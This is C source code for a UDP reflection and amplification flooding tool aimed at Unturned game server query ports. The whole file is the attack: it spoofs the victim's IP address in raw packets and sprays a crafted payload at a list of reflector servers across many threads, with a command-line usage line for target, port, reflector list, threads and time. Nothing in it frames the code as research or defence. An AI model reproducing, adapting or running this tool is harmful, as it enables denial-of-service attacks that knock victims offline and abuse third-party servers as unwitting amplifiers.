/*-------------------------------
Unturned, A Survival Game Server Amplication Script.
-------------------------------*/
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

static unsigned int DPORT = 27015;
static const char PAYLOAD[] = "\xFF\x8F\x84\x01\x25\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\x84\x84\x7F\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01\x25\x25\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x02\x02\x67\x69\x7C\x28\x6E\x88\x32\x32\x88\x01\x01\x01\x88\x88\x65\x28\x20\x24\x24\x7F\xff\x01\x01\xff\x00\x00\x00\x00\x00\x00\x00\x38\x89\x78\x71\x84\x3A\x94\x90\x84\x24\x00\x7F\x67\x7F\x65\x74\x00\x73\x83\x01\x01\x24\x74\x83\x61\x7F\x01\x74\x75\x83\x73\xFF\x28\x28\x07\x29\x28\x29\x07\x06\x06\x7C\x7C\x04\x03\xFF\x00\x01\xFF\x7C\x7C\xFF\x54\x53\x28\x28\x7C\x28\x7C\x88\x08\x7C\x28\x28\x7C\x29\x7C\x29\x08\x88\x7C\x88\x6F\x32\x07\x07\x32\x07\x75\x72\x05\x28\x28\x05\x63\x28\x04\x28\x65\x7C\x7C\x02\x20\x45\x6E\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3e\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1";

// Unturned Method Starts
#define MAX_PACKET_SIZE 4096
#define PHI 0xaaf219b9
static uint32_t Q[4096], c = 362436;
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;

struct list {
  struct sockaddr_in data;
  struct list *next;
  struct list *prev;
};
struct list *head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data {
  int thread_id;
  struct list *list_node;
  struct sockaddr_in sin;
};

void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum(unsigned short *buf, int nwords) {
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOADSIZE;
  iph->id = htonl(61337);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;
  iph->saddr = inet_addr("127.0.0.1");
}
void setup_udp_header(struct udphdr *udph) {
  udph->source = htons(61337);
  udph->dest = htons(DPORT);
  udph->check = 0;
  memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD, PAYLOADSIZE);
  udph->len = htons(sizeof(struct udphdr) + PAYLOADSIZE);
}
void *flood(void *par1) {
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct udphdr *udph = (/*u_int8_t*/ void *)iph + sizeof(struct iphdr);
  struct sockaddr_in sin = td->sin;
  struct list *list_node = td->list_node;
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if (s < 0) {
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }
  init_rand(time(NULL));
  memset(datagram, 0, MAX_PACKET_SIZE);
  setup_ip_header(iph);
  setup_udp_header(udph);
  udph->source = htons(tehport);
  iph->saddr = sin.sin_addr.s_addr;
  iph->daddr = list_node->data.sin_addr.s_addr;
  iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
  int tmp = 1;
  const int *val = &tmp;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }
  init_rand(time(NULL));
  register unsigned int i;
  i = 0;
  while (1) {
    list_node = list_node->next;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data,
           sizeof(list_node->data));
    pps++;
    if (i >= limiter) {
      i = 0;
      usleep(sleeptime);
    }
    i++;
  }
}
int main(int argc, char *argv[]) {
  if (argc < 6) {
    fprintf(stdout, "Unturned\n");
    fprintf(stdout, "Usage: %s [Target] [Port] [listfile] [Threads] [Time Limit (-1 for none)]\n",
            argv[0]);
    exit(-1);
  }
  srand(time(NULL));
  int i = 0;
  head = NULL;
  fprintf(stdout, "Loading List To Buffer...\n");
  int max_len = 512;
  char *buffer = (char *)malloc(max_len);
  buffer = memset(buffer, 0x00, max_len);
  tehport = atoi(argv[2]);
  int num_threads = atoi(argv[4]);
  int maxpps = atoi(argv[5]);
  limiter = 0;
  pps = 0;
  int multiplier = 20;
  FILE *list_fd = fopen(argv[3], "r");
  while (fgets(buffer, max_len, list_fd) != NULL) {
    if ((buffer[strlen(buffer) - 1] == '\n') ||
        (buffer[strlen(buffer) - 1] == '\r')) {
      buffer[strlen(buffer) - 1] = 0x00;
      if (head == NULL) {
        head = (struct list *)malloc(sizeof(struct list));
        bzero(&head->data, sizeof(head->data));
        head->data.sin_addr.s_addr = inet_addr(buffer);
        head->next = head;
        head->prev = head;
      } else {
        struct list *new_node = (struct list *)malloc(sizeof(struct list));
        memset(new_node, 0x00, sizeof(struct list));
        new_node->data.sin_addr.s_addr = inet_addr(buffer);
        new_node->prev = head;
        new_node->next = head->next;
        head->next = new_node;
      }
      i++;
    } else {
      continue;
    }
  }
  struct list *current = head->next;
  pthread_t thread[num_threads];
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(argv[1]);
  struct thread_data td[num_threads];
  for (i = 0; i < num_threads; i++) {
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].list_node = current;
    pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
  }
  fprintf(stdout, "Starting Flood...\n");
  for (i = 0; i < (atoi(argv[6]) * multiplier); i++) {
    usleep((1000 / multiplier) * 1000);
    if ((pps * multiplier) > maxpps) {
      if (1 > limiter) {
        sleeptime += 100;
      } else {
        limiter--;
      }
    } else {
      limiter++;
      if (sleeptime > 25) {
        sleeptime -= 25;
      } else {
        sleeptime = 0;
      }
    }
    pps = 0;
  }
  return 0;
}
